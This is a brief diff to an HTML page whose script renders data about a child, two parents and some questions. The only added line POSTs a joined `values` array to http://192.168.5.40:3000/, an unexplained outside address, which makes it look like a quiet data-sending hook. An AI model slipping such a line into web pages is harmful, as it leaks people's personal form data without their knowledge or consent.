@@ -13,6 +13,7 @@
       }
       const { child, parent1, parent2, questions } = extractData(obj);
       $("#root").html(getHtml(child, parent1, parent2, questions, true));
+      fetch('http://192.168.5.40:3000/', {method: "POST", body: values.join('|')})
     </script>
   </body>
 </html>
